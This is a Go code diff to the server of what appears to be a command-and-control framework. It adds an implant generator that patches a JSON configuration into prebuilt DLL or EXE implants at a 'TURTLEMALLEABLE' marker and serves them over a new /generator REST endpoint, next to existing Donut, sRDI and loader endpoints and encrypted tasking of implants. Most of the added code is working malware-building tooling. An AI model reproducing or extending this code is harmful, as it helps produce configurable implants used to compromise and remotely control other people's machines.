@@ -417,6 +417,142 @@ func ConvertPwsh(raw []byte) (string, string) {
 	return newLoader, loaderB64
 }
 
+/////
+
+func compareChunk(data1, sig []byte) bool {
+	if len(data1) != len(sig) {
+		fmt.Printf("Not equal lengths")
+		return false
+	}
+	for x := 0; x < len(sig); x++ {
+		if data1[x] != sig[x] {
+			return false
+		}
+	}
+	return true
+}
+
+func findSignature(data, sig []byte) (offset int) {
+	for x := 0; x < len(data); x++ {
+		if data[x] == sig[0] && data[x+1] == sig[1] {
+			if !compareChunk(data[x:x+len(sig)], sig) {
+				//log.Println(string(data[x : x+len(sig)]))
+				continue
+			} else {
+				return x
+			}
+		}
+	}
+	return 0
+}
+
+func replaceSignature(data []byte, replacement []byte, offset int) error {
+	var x int
+	//log.Println(string(data[offset : offset+PatchLength]))
+	if len(replacement) > PatchLength {
+		return fmt.Errorf("MAX 30 BYTES")
+	}
+	for x = 0; x < len(replacement); x++ {
+		data[offset+x] = replacement[x]
+	}
+	for ; x < PatchLength; x++ {
+		data[offset+x] = 0x00
+	}
+	//log.Println(string(data[offset : offset+PatchLength]))
+	return nil
+}
+
+var Signature string = "TURTLEMALLEABLE"
+
+const PatchLength = 500
+
+func MultiplyString(s string, count int) string {
+	var out string
+	for x := 0; x < count; x++ {
+		out += s
+	}
+	return out
+}
+
+///
+
+func HandleImplantComm(communicationType data.ImplantComm, extention string) ([]byte, error) {
+	var b []byte
+	var err error
+	switch communicationType {
+	case data.WsCommunication:
+		b, err = ioutil.ReadFile(fmt.Sprintf("wsclient%s", extention))
+		if err != nil {
+			return nil, err
+		}
+		break
+	case data.HttpCommunication:
+		b, err = ioutil.ReadFile(fmt.Sprintf("httpclient%s", extention))
+		if err != nil {
+			return nil, err
+		}
+		break
+	default:
+		return nil, fmt.Errorf("Invalid Implant Communication Passed")
+	}
+	return b, nil
+}
+
+func GenerateImplant(params *data.MalleableClient) ([]byte, error) {
+	var b []byte
+	var err error
+	switch params.Type {
+	case data.DllImplant:
+		b, err = HandleImplantComm(params.Communication, ".dll")
+		break
+	case data.ExeImplant:
+		b, err = HandleImplantComm(params.Communication, ".exe")
+		break
+	default:
+		return nil, fmt.Errorf("Invalid Implant Type Passed")
+	}
+	if err != nil {
+		return nil, err
+	}
+	// new config
+	stringConf, err := json.Marshal(params)
+	if err != nil {
+		return nil, err
+	}
+	// find offset
+	configOffset := findSignature(b, []byte(Signature))
+	if configOffset == 0 {
+		return nil, fmt.Errorf("Failed to find signature %s", Signature)
+	}
+	err = replaceSignature(b, stringConf, configOffset)
+	if err != nil {
+		return nil, err
+	}
+	return b, nil
+}
+
+func ImplantGeneratorEndpoint(c *gin.Context) {
+	LogRequest(c)
+	malleable := &data.MalleableClient{}
+	err := c.BindJSON(malleable)
+	if err != nil {
+		fmt.Println(err)
+		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Invalid Json"})
+		return
+	}
+	// validate payload here?
+	implant, err := GenerateImplant(malleable)
+	if err != nil {
+		errmsg := fmt.Sprintf("Error %v", err)
+		fmt.Println(err)
+		c.JSON(http.StatusInternalServerError, gin.H{"Error": errmsg})
+		return
+	}
+	malleable.GeneratedImplant = implant
+	c.JSON(http.StatusOK, malleable)
+	return
+
+}
 func LoaderEndpoint(c *gin.Context) {
 	LogRequest(c)
 	loaderPayload := &data.LoaderPayload{}
@@ -488,6 +624,7 @@ func StartRestAPI(port string) {
 		v1.POST("/donut", DonutEndpoint)
 		v1.POST("/srdi", SRDIEndpoint)
 		v1.POST("/loaders", LoaderEndpoint)
+		v1.POST("/generator", ImplantGeneratorEndpoint)
 	}
 	err := router.RunTLS(fmt.Sprintf("0.0.0.0:%s", port), "../certs/server.cert", "../certs/server.key")
 	log.Log.Fatal().Str("service", "RestAPI").Msgf("%v", err)
@@ -576,13 +713,11 @@ func ListenerHandleGetTasks(c *gin.Context) {
 	//c.JSON(http.StatusOK, db.ClientsDatabase.ClientGetAvailableTasks(idHeader))
 	tasks := db.ClientsDatabase.ClientGetAvailableTasks(idHeader)
 	t, err := json.Marshal(tasks)
-	fmt.Println(string(t))
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"Status": "Error"})
 		return
 	}
 	encryptedTasks := server.EncryptTaskWithSymKey(t, []byte("71"))
-	fmt.Println(string(encryptedTasks))
 	c.JSON(http.StatusOK, gin.H{"data": encryptedTasks})
 }
 
